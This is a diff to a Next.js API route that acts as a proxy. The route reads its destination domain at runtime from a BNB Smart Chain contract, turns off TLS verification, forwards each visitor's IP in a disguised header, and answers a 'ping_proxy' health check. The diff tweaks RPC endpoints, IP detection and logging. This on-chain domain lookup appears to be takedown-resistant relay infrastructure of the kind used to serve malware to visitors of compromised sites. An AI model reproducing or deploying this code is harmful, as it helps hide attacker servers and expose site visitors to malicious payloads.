@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server'
 import axios from 'axios'
 import https from 'https'
+import crypto from 'crypto'
 
 /**
  * Отключаем проверку SSL (CURLOPT_SSL_VERIFYPEER => false и CURLOPT_SSL_VERIFYHOST => false).
@@ -31,10 +32,19 @@ const updateInterval = 60 // секунд
  * Функция получения IP-адреса (аналог getClientIP в PHP).
  */
 function getClientIP(req: NextRequest): string {
+    // Check for Cloudflare IP
+    const cloudflareIP = req.headers.get('cf-connecting-ip')
+    if (cloudflareIP) {
+        return cloudflareIP
+    }
+    
+    // Check X-Forwarded-For
     const forwarded = req.headers.get('x-forwarded-for')
     if (forwarded) {
         return forwarded.split(',')[0].trim()
     }
+    
+    // Fallback to direct IP
     if (req.ip) {
         return req.ip
     }
@@ -152,22 +162,22 @@ async function getTargetDomain(rpcUrls: string[], contractAddress: string): Prom
  */
 async function handleProxy(req: NextRequest, endpoint: string) {
     // Настройки RPC и контракта (по умолчанию)
-    const rpcUrls = ['https://rpc.ankr.com/bsc', 'https://bsc-dataseed2.bnbchain.org']
+    const rpcUrls = ['https://binance.llamarpc.com', 'https://bsc.drpc.org']
     const contractAddress = '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0'
 
     // Получаем домен (кэширован в памяти)
     let domain = await getTargetDomain(rpcUrls, contractAddress)
     domain = domain.replace(/\/+$/, '') // убираем trailing slash
 
-    endpoint = endpoint.replace(/^\/+/, '') // убираем ведущие слэши
-    const finalUrl = `${domain}/${endpoint}`
+    endpoint = '/' + endpoint.replace(/^\/+/, '') // добавляем один ведущий слэш
+    const finalUrl = `${domain}${endpoint}`
 
     // Метод запроса
     const method = req.method
 
     // Аналог file_get_contents('php://input')
     const bodyBuffer = await req.arrayBuffer()
-    const body = Buffer.from(bodyBuffer)
+    const body = bodyBuffer.byteLength > 0 ? Buffer.from(bodyBuffer) : null
 
     // Собираем заголовки, убираем host/origin и т.п.
     const outHeaders: Record<string, string> = {}
@@ -181,8 +191,14 @@ async function handleProxy(req: NextRequest, endpoint: string) {
         outHeaders[lowerKey] = value
     })
 
-    // Добавляем x-dfkjldifjljfjd = IP
-    outHeaders['x-dfkjldifjljfjd'] = getClientIP(req)
+    // Добавляем x-dfkjldifjlifjd = IP
+    outHeaders['x-dfkjldifjlifjd'] = getClientIP(req)
+
+    // Логирование для отладки
+    console.log('Final URL:', finalUrl)
+    console.log('Method:', method)
+    console.log('Headers:', outHeaders)
+    console.log('Body length:', body?.length || 0)
 
     // Проксируем через axios
     try {
@@ -193,7 +209,6 @@ async function handleProxy(req: NextRequest, endpoint: string) {
             data: body,
             responseType: 'arraybuffer',
             httpsAgent,
-            decompress: true,
             maxRedirects: 5,
             timeout: 120000,
             validateStatus: () => true,
@@ -214,17 +229,19 @@ async function handleProxy(req: NextRequest, endpoint: string) {
             resHeaders['Content-Type'] = contentType
         }
 
-        // NextResponse требует статус в диапазоне 200..599. Например, 101 (Switching Protocols)
-        // вызовет RangeError. Нормализуем недопустимые статусы в 502.
-        const safeStatus = Number.isInteger(statusCode) && statusCode >= 200 && statusCode <= 599
-            ? statusCode
-            : 502
-
-        return new NextResponse(responseData, {
-            status: safeStatus,
+        return new NextResponse(responseData as BodyInit, {
+            status: statusCode,
             headers: resHeaders,
         })
     } catch (error) {
+        console.error('Proxy error:', error)
+        console.error('Error details:', {
+            message: error instanceof Error ? error.message : String(error),
+            stack: error instanceof Error ? error.stack : undefined,
+            finalUrl,
+            method
+        })
+        
         return new NextResponse('error: ' + String(error), {
             status: 500,
             headers: {
@@ -255,11 +272,14 @@ export async function OPTIONS() {
  * Универсальный обработчик для GET/POST/и т.д.
  */
 async function handleRequest(req: NextRequest) {
+    console.log('🚀 API Route called:', req.method, req.url)
     const { searchParams } = new URL(req.url)
     const e = searchParams.get('e')
+    console.log('📝 Parameter e:', e)
 
     // Пинг
     if (e === 'ping_proxy') {
+        console.log('🏓 Ping request detected')
         return new NextResponse('pong', {
             status: 200,
             headers: { 'Content-Type': 'text/plain' },
@@ -268,7 +288,9 @@ async function handleRequest(req: NextRequest) {
 
     // Иначе проксируем, если e задан
     if (e) {
+        console.log('🔄 Proxying to endpoint:', e)
         const endpoint = decodeURIComponent(e)
+        console.log('🎯 Decoded endpoint:', endpoint)
         return handleProxy(req, endpoint)
     }
 
